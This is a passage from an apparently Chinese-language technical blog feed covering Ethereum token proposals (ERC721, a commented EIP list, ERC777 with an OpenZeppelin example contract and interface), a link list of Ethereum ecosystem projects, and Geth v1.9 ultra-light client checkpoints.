<p>​    有关tokenURI元数据JSON架构的更多信息，请参考==&gt;<a href="https://eips.ethereum.org/EIPS/eip-721">https://eips.ethereum.org/EIPS/eip-721</a></p>
<h3 id="ERC721-合约的前置功能"><a href="#ERC721-合约的前置功能" class="headerlink" title="ERC721 合约的前置功能"></a>ERC721 合约的前置功能</h3><p>​    ERC721可用的预设有ERC721PresetMinterPauserAutoId。它已预设为允许Token铸造（创建），停止所有令牌传输（暂停），并允许持有人焚毁（销毁）其Token。合同使用访问控制来控制对铸造和暂停功能的访问。部署合同的帐户将被授予minter 和pauser 角色，以及默认的admin角色。</p>
<p>​    无需编写任何Solidity代码即可立即部署此合同。它可以原样用于快速原型制作和测试，但也适用于生产环境。</p>
<p>关联内容 ==&gt; <a href="https://willzhuang.github.io/2019/07/04/ERC20-721Token%E7%9A%84%E5%8F%91%E8%A1%8C-%E5%86%BB%E7%BB%93-%E5%A4%9A%E6%96%B9%E7%AD%BE%E5%90%8D%E5%8A%9F%E8%83%BD">https://willzhuang.github.io/2019/07/04/ERC20-721Token的发行-冻结-多方签名功能</a></p>
]]></content>
      <tags>
        <tag>Token</tag>
      </tags>
  </entry>
  <entry>
    <title>ERC关注列表</title>
    <url>/2020/03/23/ERC%E5%85%B3%E6%B3%A8%E5%88%97%E8%A1%A8/</url>
    <content><![CDATA[<p>以下列表均为<a href="https://eips.ethereum.org/erc">Ethereum token</a>相关的提案：</p>
<p>EIP1080 这个是一种可以恢复的 token，其诞生的主要原因是因为以太坊的DAO之前的币被盗用才创建这个ip的，可以从合约层面恢复被盗或丢失的账户，这也减轻合理可证明的令牌或资产损失或盗窃的影响，并帮助解决其他冲突。不应该因为丢失、盗窃或冲突而修改Ethereum的协议，但是可以在智能契约层解决这些问题。其中定义的接口有一个抽象方法叫做claimLost，我在想这个东西是否可以利用在一些类似于财产险的场景中</p>
<p>EIP1132 可以对ERC20进行时间锁定，这就使得在一些交易过程中不需要将ERC20转给其他第三方的资金托管智能合约，因为这种托管的方式你需要额外的信任这个托管合约，而且在转账给托管合约的时候会造成gas的消耗</p>
<p>EIP998 是一种针对721和20以及223的扩展，使721token能够拥有其他721token和20token，使20和223能够由721令牌拥有，该规范涵盖了四种不同类型的可组合，998721(20)自顶向下的可组合token，用于接收、持有和传输721(20)token，998721(20)自底向上的可组合token，它们将自己附加到其他721token上，还包含一个rootowner的概念，这种token组合是一个树形的结构</p>
<p>EIP1175 是一种区块链电商的解决方案，通过提供一个center，这个center面向buyer能够快速建立一个钱包，面向saler可以快速建立一个商店，而且能够创建自己商店的结算erc20token。经分析可以使用在积分，代金券，优惠券等场景中</p>
<p>EIP902 token validator 提供token所有权和传输验证的服务协议，服务于监管机构的KYC和AML验证，因为监管机构需要将诸如身份等的非链合规信息与链上服务联系起来，通过一个共享的白名单而不是每个token都建立自己的白名单</p>
<p>EIP1207 类似于OAuth经过第三方授权</p>
<p>EIP1261 成员资格验证令牌 MVT 依然属于KYC的范畴，比如一些许可证的签发，例如在一些区块链的反洗钱应用，需要把一些地址和成员资格关联起来，达到监管的目的，也存在一种场景，就是我们自己发行的erc20token我们希望只能在我们许可的会员间传递</p>
<p>EIP1450 给了我一个启发就是合规和监管对应的要求应该从合约层面解决，仅仅是对原有的ERC20加了一些modifier就可以满足监管和法律的要求，ERC-1450必须防止任何人执行转移、允许和批准功能和/或实现这些功能，否则总是会失败，ERC-1450更新了transferFrom、mint和burnFrom函数。转让方、铸币方和burnFrom只能由RTA执行，且受限于唯一发布的转让方修改人。此外，ERC-1450还定义了transferOwnership、setTransferAgent、setPhysicalAddressOfOperation和isTransferAgent等函数。只有发行者可以调用transferOwnership、setTransferAgent和setPhysicalAddressOfOperation函数。任何人都可以调用isTransferAgent函数。</p>
<p>EIP1462 基本的安全token 这些要求包括KYC(了解您的客户)和AML(反洗钱)规则，以及为账户锁定令牌并限制其因法律纠纷而转移的能力。还可以附加附加的法律文档，以便在令牌和off-chain法律实体之间建立双重绑定关系。这个草案对EIP1400和EIP1450都不太认同，因为这两个草案都包含一些特定的场景，是比较小众的需求，1411和1410无法支持777，1066将引入一个转移检查功能，这包含四个新函数，用于检查所提供的输入是否允许操作</p>
<p>EIP1523 保单721标准，提供了一个jsonSchema，这个jsonSchema类似一个Interface接口，包含符合该标准的一些属性和需要实现的方法</p>
<p>EIP1948 对721的一个升级，因为有需求希望NFT用例能够与一个动态数据进行关联，该token可以在其生命周期内更改这个动态数据，如果有了这个，区块链电子病历和电子保单就能拥有动态的可修改的数据了</p>
<p>EIP1996 可持有的token，这里指的是这个token可以被hold，而不是以前的token只能被own，这就意味着第三方可以hold同一笔token而不是own他，这位监管提供了一个很好的方案，持有指定了付款人、收款人、最高金额、公证员和到期日。在创建持有时，将暂停支付方的指定令牌余额。持有余额在执行或释放之前不能转移。持有只能由公证人执行，这将触发令牌从付款人向收款人的转移。如果在任何时候由公证员或在期满后由任何人解除持有，则不进行任何转让，并且支付人可以再次获得该金额。在一些业务下，必须在事先不知道确切金额的情况下保证付款，比如酒店可以暂停客人的账户，作为对任何可能的额外服务(如客房服务)的担保。当客人结账离开时，持有部分被执行，剩余的金额仍然在客人的账户上。而在其他一些业务情况下，在使用其服务之前必须保证支付。例如:当入住酒店时，酒店会hold客人的账户，以确保在交钥匙之前有足够的余额支付房间费用。</p>
<p>EIP2018 可清除的token，其角色包含一个清算代理，操作员，开证申请人，清算过程将资金转移的承诺转化为资金从一个账户到另一个账户的实际流动。清算代理决定是否可以执行转移。应当转让的数额不能从支付人的余额中扣除，也不能用于其他转让，因此，保证了转让的执行是成功的。一个受管制的令牌需要符合所有的法律要求，特别是KYC和AML。其中一些检查可能无法在链上完成，因此传输可能无法在一个步骤中完成。目前还没有EIP来实现这样的外链检查。这个提议允许用户订购一个转移，可以由一个链外清算代理进行检查。根据它的结果，清算代理将执行或取消转移。要提供有关为何取消转账的更多信息，清算代理可以添加未执行转账的原因。</p>
<p>EIP2019 可资助的令牌，ERC-20标准令牌的扩展，允许令牌钱包所有者通过调用智能契约并附加一个资金指令字符串来请求为钱包提供资金。其角色包含一个令牌钱包的主人，象征性的合约所有者/代理人，开证申请人，令牌钱包所有者(或经过批准的地址)可以通过区块链订购令牌化请求。这是通过调用orderFund或orderFundFrom方法来完成的，这些方法启动令牌契约操作符的工作流，以支持或拒绝资金请求。在这种情况下，在提交请求时提供资金指令，操作人员使用这些指令来确定要借记的资金来源，以便(通过minting)为令牌钱包提供资金。一般而言，在区块链上逐字逐句地放置用于借记资金的显式路由指令是不可取的，建议使用私有通信替代方法，如私有通道、加密存储或类似的方法(在区块链分类帐之外)来这样做。另一种(不太理想的)可能性是将这些指令以加密的形式放在指令字段中。现在，大多数的令牌发行/资金请求，基于任何基于菲亚特的支付方法，需要一个以前的集中交易，能够获得所需的令牌发行请求者的钱包。为了尝试将所有需要的步骤引入到分散化中，公开令牌生命周期和支付事务的所有需要的步骤，一个资金请求可以允许钱包所有者通过区块链发起资金请求。关键好处:资金和付款的可追溯性得到了加强，从而使入账成为可能。所有的付款状态可以存储在链。几乎所有的货币/令牌生命周期都是通过一种分散的方法来覆盖的，并辅之以在生态系统中普遍使用的私有通信。</p>
<p>EIP2020 电子货币标准，如今，金融机构使用电子系统，这些系统在核心银行系统的数据库中保存账户余额。为了让一家机构能够保留客户账户余额的记录，并将其提供给客户，该机构必须在一个已知的法律框架下进行监管，而且必须拥有这样做的许可证。在监管监督下维持许可证，需要确保合规(即对所有客户执行KYC，并在允许交易前确保良好的“反洗钱”操作)，并通过定期审计证明其技术和运营偿付能力，以便向机构存放资金的客户可以放心，他们的资金是安全的。</p>
<p>EIP2021 可支付令牌，令牌钱包的所有者(或批准的地址)可以通过区块链订购支付请求。这是通过调用orderPayoutFrom或orderPayoutFrom方法来完成的，这些方法启动令牌契约操作符的工作流，以支持或拒绝支付请求。在这种情况下，在提交请求时提供支付指令，操作人员使用这些指令来确定资金的目的地。通常，不建议在区块链上逐字逐句地为支出设置显式路由指令，建议使用私有通信替代方法，例如私有通道、加密存储或类似的方法(在区块链分类账之外)。另一种(不太理想的)可能性是将这些指令以加密的形式放在指令字段中。</p>
]]></content>
      <tags>
        <tag>EIP</tag>
      </tags>
  </entry>
  <entry>
    <title>Ethereum ecosystem</title>
    <url>/2020/08/24/Ethereum%20ecosystem/</url>
    <content><![CDATA[<h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><ol>
<li>Rust : <a href="https://github.com/openethereum/openethereum">https://github.com/openethereum/openethereum</a></li>
<li>Go : <strong><a href="https://github.com/ethereum/go-ethereum">https://github.com/ethereum/go-ethereum</a></strong>， <a href="https://github.com/etclabscore/core-geth">https://github.com/etclabscore/core-geth</a></li>
<li>.Net ： <a href="https://github.com/Nethereum/Nethereum">https://github.com/Nethereum/Nethereum</a></li>
<li>C++ ： <a href="https://github.com/ethereum/aleth">https://github.com/ethereum/aleth</a></li>
<li>ConsenSys &amp; jp morganchase : <strong><a href="https://github.com/ConsenSys/quorum">https://github.com/ConsenSys/quorum</a></strong></li>
<li>burrow : <a href="https://github.com/hyperledger/burrow">https://github.com/hyperledger/burrow</a></li>
<li>ethermint ： <a href="https://github.com/ChainSafe/ethermint">https://github.com/ChainSafe/ethermint</a></li>
<li>besu (Java) ：<a href="https://github.com/hyperledger/besu">https://github.com/hyperledger/besu</a></li>
<li><a href="https://github.com/clearmatics/ion">Ion</a> ： <a href="https://github.com/clearmatics/autonity">https://github.com/clearmatics/autonity</a></li>
</ol>
<h3 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h3><ol>
<li>JS ： <a href="https://github.com/ethereumjs/ethereumjs-vm">https://github.com/ethereumjs/ethereumjs-vm</a></li>
<li>SSVM ： <a href="https://github.com/second-state/SSVM">https://github.com/second-state/SSVM</a></li>
<li>WAVM ： <a href="https://github.com/WAVM/WAVM">https://github.com/WAVM/WAVM</a></li>
<li>evmone ： <a href="https://github.com/ethereum/evmone">https://github.com/ethereum/evmone</a></li>
<li>Hera ： <a href="https://github.com/ewasm/hera">https://github.com/ewasm/hera</a></li>
</ol>
<h3 id="大数据"><a href="#大数据" class="headerlink" title="大数据"></a>大数据</h3><ol>
<li>ethereum-etl ： <a href="https://github.com/blockchain-etl/ethereum-etl">https://github.com/blockchain-etl/ethereum-etl</a></li>
<li>GraphQL ： <a href="https://github.com/ConsenSys/ethql">https://github.com/ConsenSys/ethql</a></li>
<li>Graph Node ： <a href="https://github.com/graphprotocol/graph-node">https://github.com/graphprotocol/graph-node</a></li>
</ol>
<h3 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h3><ol>
<li>mythril ： <strong><a href="https://github.com/ConsenSys/mythril">https://github.com/ConsenSys/mythril</a></strong></li>
<li>truffle-security ： <strong><a href="https://github.com/ConsenSys/truffle-security">https://github.com/ConsenSys/truffle-security</a></strong></li>
<li>sm ： <strong><a href="https://github.com/tjfoc/gmsm">https://github.com/tjfoc/gmsm</a></strong></li>
</ol>
<h3 id="隐私"><a href="#隐私" class="headerlink" title="隐私"></a>隐私</h3><ol>
<li>ZoKrates ： <a href="https://github.com/Zokrates/ZoKrates">https://github.com/Zokrates/ZoKrates</a></li>
<li>AZTEC ： <a href="https://github.com/AztecProtocol/AZTEC">https://github.com/AztecProtocol/AZTEC</a></li>
<li>privacy-enabled-erc721 ： <a href="https://github.com/centrifuge/privacy-enabled-erc721">https://github.com/centrifuge/privacy-enabled-erc721</a></li>
<li>nightlite(JS) ： <a href="https://github.com/EYBlockchain/nightlite">https://github.com/EYBlockchain/nightlite</a></li>
</ol>
<h3 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a>浏览器</h3><ol>
<li>blockscout ： <a href="https://github.com/poanetwork/blockscout">https://github.com/poanetwork/blockscout</a></li>
<li>MyEtherWallet  ： <strong><a href="https://github.com/EthVM/EthVM">https://github.com/EthVM/EthVM</a></strong></li>
<li>dashboard ： <strong><a href="https://github.com/Alethio/ethstats-network-dashboard">https://github.com/Alethio/ethstats-network-dashboard</a></strong>，<a href="https://ethstats.io/">https://ethstats.io/</a></li>
<li>lite ： <strong><a href="https://github.com/Alethio/ethereum-lite-explorer">https://github.com/Alethio/ethereum-lite-explorer</a></strong>，<a href="https://explorer.aleth.io/">https://explorer.aleth.io/</a></li>
<li>ERC721 token list : <strong><a href="https://github.com/Alethio/explorer-plugin-opensea">https://github.com/Alethio/explorer-plugin-opensea</a></strong></li>
<li>data scrap ： <strong><a href="https://github.com/Alethio/memento">https://github.com/Alethio/memento</a></strong></li>
<li>hyperledger ： <a href="https://github.com/hyperledger/blockchain-explorer">https://github.com/hyperledger/blockchain-explorer</a></li>
</ol>
<h3 id="客户端-1"><a href="#客户端-1" class="headerlink" title="客户端"></a>客户端</h3><ol>
<li>MyEtherWallet : <a href="https://github.com/MyEtherWallet/MyEtherWallet">https://github.com/MyEtherWallet/MyEtherWallet</a></li>
<li>wallet-core (C++) ： <a href="https://github.com/trustwallet/wallet-core">https://github.com/trustwallet/wallet-core</a></li>
<li>MultiSigWallet ： <a href="https://github.com/ConsenSys/MultiSigWallet">https://github.com/ConsenSys/MultiSigWallet</a></li>
<li>ethsigner ： <a href="https://github.com/PegaSysEng/ethsigner/">https://github.com/PegaSysEng/ethsigner/</a></li>
</ol>
<h3 id="DApp-Framework"><a href="#DApp-Framework" class="headerlink" title="DApp Framework"></a>DApp Framework</h3><ol>
<li>embark ： <a href="https://github.com/embarklabs/embark">https://github.com/embarklabs/embark</a></li>
<li>openzeppelin-contracts : <a href="https://github.com/OpenZeppelin/openzeppelin-contracts">https://github.com/OpenZeppelin/openzeppelin-contracts</a></li>
<li>TRUFFLE ： <a href="https://github.com/trufflesuite">https://github.com/trufflesuite</a></li>
<li>ethereumjs-util ： <a href="https://github.com/ethereumjs/ethereumjs-util">https://github.com/ethereumjs/ethereumjs-util</a></li>
<li>aragonOS ： <a href="https://github.com/aragon/aragonOS">https://github.com/aragon/aragonOS</a></li>
<li>eth-crypto ： <a href="https://github.com/pubkey/eth-crypto">https://github.com/pubkey/eth-crypto</a></li>
<li>voting_dapp ： <a href="https://github.com/maheshmurthy/ethereum_voting_dapp">https://github.com/maheshmurthy/ethereum_voting_dapp</a></li>
</ol>
<h3 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h3><ol>
<li>eventeum ： <a href="https://github.com/ConsenSys/eventeum">https://github.com/ConsenSys/eventeum</a></li>
</ol>
<h3 id="SDK"><a href="#SDK" class="headerlink" title="SDK"></a>SDK</h3><ol>
<li>web3.js ： <a href="https://github.com/ethereum/web3.js">https://github.com/ethereum/web3.js</a></li>
<li>java ： <a href="https://github.com/web3j/web3j">https://github.com/web3j/web3j</a></li>
<li>react ： <a href="https://github.com/NoahZinsmeister/web3-react">https://github.com/NoahZinsmeister/web3-react</a></li>
<li>go ： <a href="https://github.com/Alethio/web3-go%EF%BC%8C">https://github.com/Alethio/web3-go，</a> <a href="https://github.com/umbracle/go-web3">https://github.com/umbracle/go-web3</a></li>
</ol>
<h3 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h3><ol>
<li>雷电网络 ： <a href="https://github.com/raiden-network/raiden">https://github.com/raiden-network/raiden</a></li>
<li>离线支付 ： <a href="https://github.com/perun-network/go-perun">https://github.com/perun-network/go-perun</a></li>
<li>Hyperledger (Ethereum &amp; Quorum &amp; fabric) ： <a href="https://github.com/hyperledger/cactus">https://github.com/hyperledger/cactus</a></li>
</ol>
<h3 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h3><ol>
<li>E-Money ： <a href="https://github.com/IoBuilders/em-token">https://github.com/IoBuilders/em-token</a></li>
<li>可仲裁Token ： <a href="https://github.com/kleros/erc-792">https://github.com/kleros/erc-792</a></li>
</ol>
<h3 id="Ethereum-2-0"><a href="#Ethereum-2-0" class="headerlink" title="Ethereum 2.0"></a>Ethereum 2.0</h3><ol>
<li>lighthouse ： <a href="https://github.com/sigp/lighthouse">https://github.com/sigp/lighthouse</a></li>
<li>explorer ： <a href="https://github.com/Alethio/eth2stats-client">https://github.com/Alethio/eth2stats-client</a></li>
</ol>
]]></content>
      <tags>
        <tag>Ethereum</tag>
      </tags>
  </entry>
  <entry>
    <title>Ethereum Light clients</title>
    <url>/2019/12/20/Ethereum%20Light%20clients/</url>
    <content><![CDATA[<p>go-ethereum 在 2019 年 7 月推出了 v1.9.x 版本。</p>
<p>Geth v1.9.0为轻型客户端提供了一种新模式，称为超轻型客户端 <code>ultra light client</code>。</p>
<p>此模式旨在将自己定位在受信任服务器和轻型服务器之间的安全范围中，用来自大多数受信任服务器的数字签名代替PoW验证。借助来自独立实体的足够签名，可以为非关键DApp实现远远超过足够的安全性。就是说，超轻量客户端模式并不是真正针对您的普通节点，而是希望将Geth嵌入到自己的流程中的项目。</p>
<p>轻客户端不下载和验证任何块头，而是使用硬编码检查点（hard coded checkpoint）作为起点。这个检查点包含了全部的必要的信息，从而验证之前的区块的正确性。所以从安全角度而言，没有任何的损失。</p>
<p>但是硬编码检查点（hard coded checkpoint）也有缺点：</p>
<ul>
<li>由于检查点被硬编码到发行版二进制文件中，因此较旧的发行版将始终从较旧的块开始同步。几个月就可以了，但是最终变得很烦人。当然，您可以更新Geth来获取一个新的检查点，也可以获取所有的变更，但是很少有人希望这样做。</li>
<li>由于这些检查点已嵌入到代码中，因此如果您想在自己的专用网络中支持它们，那将很不幸，需要修改Geth，或通过配置文件配置检查点，并在每次更新检查点时分发一个新文件。可行，但长期而言并不可行。</li>
</ul>
<p><code>Geth v1.9.x</code> 附带了对链上检查点oracle的支持。超轻型客户端 <code>ultra light client</code> 可以不依赖于硬编码的检查点，而可以联系远程轻服务器，并要求它们返回存储在链上智能合约中的更新的检查点。最好的部分是，超轻型客户端 <code>ultra light client</code> 可以通过密码证明返回的数据已由所需数量的批准验证者签名！</p>
<p>等等，超轻型客户端 <code>ultra light client</code> 如何知道谁被授权签署链上检查站？对于开箱即用的受支持网络，Geth附带硬编码的检查点oracle地址和授权签署者的列表；对于专用网络，可以通过配置文件指定oracle详细信息。</p>
<p>尽管新旧检查点机制看起来很相似（两者都需要Geth或配置文件中的硬编码数据），但新检查点oracle只需要配置一次，然后可以任意长时间使用以发布新的检查点。</p>
<p><code>checkpoint-admin</code> —<code>Geth v1.9.x</code> 附带的针对 <code>checkpoint oracle contract</code> 的管理工具。</p>
<p><code>checkpoint-admin</code> 可用于查询已部署合同的状态。<code>--rpc</code> 需要指向一个light node，或者一个开启 <code>--lightserv</code> 特性的 full node。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> checkpoint-admin --rpc ~/.ethereum/rinkeby/geth.ipc status</span></span><br><span class="line">Oracle =&gt; 0xebe8eFA441B9302A0d7eaECc277c09d20D684540</span><br><span class="line"></span><br><span class="line">Admin 1 =&gt; 0xD9C9Cd5f6779558b6e0eD4e6Acf6b1947E7fA1F3</span><br><span class="line">Admin 2 =&gt; 0x78d1aD571A1A09D60D9BBf25894b44e4C8859595</span><br><span class="line">Admin 3 =&gt; 0x286834935f4A8Cfb4FF4C77D5770C2775aE2b0E7</span><br><span class="line">Admin 4 =&gt; 0xb86e2B0Ab5A4B1373e40c51A7C712c70Ba2f9f8E</span><br><span class="line"></span><br><span class="line">Checkpoint (published at #4638418) 140 =&gt; 0x488c2eba92d31baeccfb6968fad5c21a3df93181b43b4cf253b4d572b64172ef</span><br></pre></td></tr></table></figure>

<p>该命令也可以用户部署一个oracle，用以更新checkpoint，并publish该checkpoint到区块链网络中。</p>
<p>将来，<code>checkpoint-admin</code> 也可以离线工作，并有 clef 钱包签名。</p>
<p>参考文档==&gt; <a href="https://blog.ethereum.org/2019/07/10/geth-v1-9-0/">Geth v1.9.0 Six months distilled</a></p>
]]></content>
      <tags>
        <tag>Ethereum</tag>
      </tags>
  </entry>
  <entry>
    <title>ERC777介绍</title>
    <url>/2020/03/15/ERC777%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p><a href="https://eips.ethereum.org/EIPS/eip-777">ERC777</a>保持与 ERC20 兼容。</p>
<p>操作员通常利用合约发送token，并具备发送 / 接收钩子，以使得持有者对其token拥有更多的控制权。</p>
<p>它利用 <a href="https://eips.ethereum.org/EIPS/eip-1820">ERC1820</a> 来了解在合同和用户地址收到token时是否以及在何处通知它们。</p>
<h3 id="解决的问题-相对于ERC20的优点"><a href="#解决的问题-相对于ERC20的优点" class="headerlink" title="解决的问题(相对于ERC20的优点)"></a>解决的问题(相对于ERC20的优点)</h3><ol>
<li>同样使用 <code>send(dest, value, data)</code> 发送Ether</li>
<li>使用 <code>tokensToSend</code> 钩子，合约和用户地址都可以控制和拒绝发送出去的token</li>
<li>使用 <code>tokensReceived </code> 钩子，合约和用户地址都可以控制和拒绝接收到的token</li>
<li><code>tokensReceived </code> 钩子允许发送token到合约地址，并在交易中心发出通知。而ERC20需要<code>approve/transferFrom</code> 两次调用才能达到这样的效果</li>
<li>token持有人可以指定/去除操作员（合约）地址，这些操作员通常是已经验证过的合约contract，例如交易所，支票处理器或自动收费系统</li>
<li>每一笔交易含有 <code>data</code> 和 <code>operatorData</code> ，它们是bytes字段，在token持有人和操作员之间传递信息</li>
<li><code>tokensReceived </code> 钩子函数可以通过代理合约来部署，所以ERC777是与ERC20钱包兼容的</li>
</ol>
<h3 id="构建ERC777合约"><a href="#构建ERC777合约" class="headerlink" title="构建ERC777合约"></a>构建ERC777合约</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.5</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/token/ERC777/ERC777.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract GLDToken is ERC777 &#123;</span><br><span class="line">    <span class="title">constructor</span>(<span class="params"></span></span><br><span class="line"><span class="params">        uint256 initialSupply,</span></span><br><span class="line"><span class="params">        address[] memory defaultOperators</span></span><br><span class="line"><span class="params">    </span>)</span><br><span class="line">        <span class="title">ERC777</span>(<span class="params"><span class="string">&quot;Gold&quot;</span>, <span class="string">&quot;GLD&quot;</span>, defaultOperators</span>)</span><br><span class="line">        <span class="title">public</span></span><br><span class="line">    &#123;</span><br><span class="line">        _mint(msg.sender, msg.sender, initialSupply, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ERC777扩展了ERC20，对ERC20提供兼容性支持。使用 <code>_mint</code> 将 <code>initialSupply</code> 分配给部署者帐户。与ERC20的_mint不同，此参数包含一些额外的参数，但是可以放心地忽略它们。</p>
<p><code>initialSupply</code> 没有设定小数。ERC777规定小数始终返回固定值18，因此无需自行设置。</p>
<p>最后，我们需要设置defaultOperators：操作员帐户（通常是智能合约地址），该帐户将能够代表其持有者转让token。如果不打算在token中使用操作员（合约），则只需传递一个空数组即可。</p>
<p>基本的ERC777合约就是这样！ 现在，对其进行部署，并使用相同的balanceOf方法来查询部署者的余额：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> GLDToken.balanceOf(deployerAddress)</span></span><br><span class="line">1000</span><br></pre></td></tr></table></figure>

<p>要将token从一个帐户转移到另一个帐户，既可以使用ERC20的“transfer”方法，也可以使用新的ERC777的“send”方法，其作用非常相似，但是增加了一个可选的<code>data</code>字段：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> GLDToken.transfer(otherAddress, 300)</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> GLDToken.send(otherAddress, 300, <span class="string">&quot;&quot;</span>)</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> GLDToken.balanceOf(otherAddress)</span></span><br><span class="line">600</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> GLDToken.balanceOf(deployerAddress)</span></span><br><span class="line">400</span><br></pre></td></tr></table></figure>

<p>ERC777接口定义如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">interface ERC777Token &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">string memory</span>)</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">symbol</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">string memory</span>)</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">totalSupply</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint256</span>)</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">balanceOf</span>(<span class="params">address holder</span>) <span class="title">external</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint256</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义代币最小的划分粒度。</span></span><br><span class="line">    <span class="comment">// 要求必须在创建时设定，之后不可以更改，不管是在铸币、发送还是销毁操作的代币数量，必需是粒度的整数倍</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">granularity</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint256</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 操作员 相关的操作（操作员是可以代表持有者发送和销毁代币的账号地址）</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">defaultOperators</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">address[] memory</span>)</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">isOperatorFor</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">        address operator,</span></span></span><br><span class="line"><span class="function"><span class="params">        address holder</span></span></span><br><span class="line"><span class="function"><span class="params">    </span>) <span class="title">external</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">bool</span>)</span>;</span><br><span class="line">    <span class="comment">// 设置一个地址作为 msg.sender 的操作员，需要触发 AuthorizedOperator 事件</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">authorizeOperator</span>(<span class="params">address operator</span>) <span class="title">external</span></span>;</span><br><span class="line">    <span class="comment">// 移除 msg.sender 上 operator 操作员的权限， 需要触发 RevokedOperator 事件</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">revokeOperator</span>(<span class="params">address operator</span>) <span class="title">external</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发送代币</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">send</span>(<span class="params">address to, uint256 amount, bytes calldata data</span>) <span class="title">external</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">operatorSend</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">        address <span class="keyword">from</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">        address to,</span></span></span><br><span class="line"><span class="function"><span class="params">        uint256 amount,</span></span></span><br><span class="line"><span class="function"><span class="params">        bytes calldata data,</span></span></span><br><span class="line"><span class="function"><span class="params">        bytes calldata operatorData</span></span></span><br><span class="line"><span class="function"><span class="params">    </span>) <span class="title">external</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 销毁代币</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">burn</span>(<span class="params">uint256 amount, bytes calldata data</span>) <span class="title">external</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">operatorBurn</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">        address <span class="keyword">from</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">        uint256 amount,</span></span></span><br><span class="line"><span class="function"><span class="params">        bytes calldata data,</span></span></span><br><span class="line"><span class="function"><span class="params">        bytes calldata operatorData</span></span></span><br><span class="line"><span class="function"><span class="params">    </span>) <span class="title">external</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发送代币事件</span></span><br><span class="line">    event Sent(</span><br><span class="line">        address indexed operator,</span><br><span class="line">        address indexed <span class="keyword">from</span>,</span><br><span class="line">        address indexed to,</span><br><span class="line">        uint256 amount,</span><br><span class="line">        bytes data,</span><br><span class="line">        bytes operatorData</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 铸币事件</span></span><br><span class="line">    event Minted(</span><br><span class="line">        address indexed operator,</span><br><span class="line">        address indexed to,</span><br><span class="line">        uint256 amount,</span><br><span class="line">        bytes data,</span><br><span class="line">        bytes operatorData</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 销毁代币事件</span></span><br><span class="line">    event Burned(</span><br><span class="line">        address indexed operator,</span><br><span class="line">        address indexed <span class="keyword">from</span>,</span><br><span class="line">        uint256 amount,</span><br><span class="line">        bytes data,</span><br><span class="line">        bytes operatorData</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 授权操作员事件</span></span><br><span class="line">    event AuthorizedOperator(</span><br><span class="line">        address indexed operator,</span><br><span class="line">        address indexed holder</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 撤销操作员事件</span></span><br><span class="line">    event RevokedOperator(address indexed operator, address indexed holder);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

